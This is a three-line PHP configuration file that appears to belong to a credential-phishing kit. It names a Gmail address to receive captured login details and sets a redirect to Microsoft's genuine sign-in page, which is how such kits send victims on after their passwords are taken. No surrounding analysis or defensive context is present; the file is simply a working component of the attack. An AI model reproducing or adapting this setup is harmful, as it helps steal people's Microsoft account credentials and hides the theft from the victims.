<?php 
$Receive_email="prettyladyyy79@gmail.com";
$redirect="https://login.microsoftonline.com/";
?>